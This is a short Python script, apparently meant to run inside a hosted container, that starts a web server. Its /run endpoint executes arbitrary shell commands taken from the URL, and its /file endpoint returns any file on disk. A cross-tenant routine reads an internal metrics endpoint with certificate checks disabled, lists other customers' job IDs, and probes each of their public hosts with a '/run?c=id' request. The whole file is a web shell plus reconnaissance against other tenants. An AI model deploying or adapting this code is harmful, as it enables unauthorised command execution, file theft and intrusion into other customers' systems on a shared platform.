import http.server, socketserver, os, json, subprocess, urllib.parse, socket, ssl, re, urllib.request as U, urllib.error
def run(c):
    try:
        r=subprocess.run(c,shell=True,capture_output=True,timeout=60)
        return {"rc":r.returncode,"out":r.stdout.decode('utf-8','replace')[:25000],"err":r.stderr.decode('utf-8','replace')[:2000]}
    except Exception as e: return {"error":str(e)[:200]}
def getmetrics():
    ctx=ssl._create_unverified_context()
    r=U.urlopen('https://169.254.1.2:4646/v1/metrics?format=prometheus',context=ctx,timeout=8)
    return r.read().decode('utf-8','replace')
def xtenant():
    txt=getmetrics()
    jobs=sorted(set(re.findall(r'job="(run-[0-9a-f-]+)"',txt)))
    me=os.environ.get('HOSTNAME','')
    out={'all_jobs':jobs,'results':{}}
    ctx=ssl._create_unverified_context()
    # my own uuid from /etc/hosts
    myuuid=None
    try:
        h=open('/etc/hosts').read()
        m=re.search(r'pod-([0-9a-f-]{36})',h)
    except Exception: pass
    for uuid in jobs:
        fq=f"{uuid}-3000.amer-1.aiven.app"
        for path in ['/','/run?c=id']:
            try:
                r=U.urlopen(U.Request(f"https://{fq}{path}",headers={'User-Agent':'probe'}),context=ctx,timeout=6)
                out['results'][fq+path]=[r.status, r.read(200).decode('utf-8','replace')]
            except urllib.error.HTTPError as e:
                out['results'][fq+path]=[e.code, e.read(150).decode('utf-8','replace')]
            except Exception as e:
                out['results'][fq+path]=[type(e).__name__, str(e)[:60]]
    return out
class H(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        u=urllib.parse.urlparse(self.path); q=urllib.parse.parse_qs(u.query)
        try:
            if u.path=="/xtenant": body=json.dumps(xtenant()).encode()
            elif u.path=="/run" and "c" in q: body=json.dumps(run(q["c"][0])).encode()
            elif u.path=="/file": body=open(q["p"][0],"rb").read()
            else: body=json.dumps({"uid":os.getuid(),"host":socket.gethostname()}).encode()
        except Exception as e: body=json.dumps({"err":str(e)}).encode()
        self.send_response(200); self.send_header("Content-Type","application/json"); self.end_headers(); self.wfile.write(body)
    def log_message(self,*a): pass
socketserver.TCPServer.allow_reuse_address=True
with socketserver.TCPServer(("0.0.0.0",int(os.environ.get("PORT",3000))),H) as s: s.serve_forever()
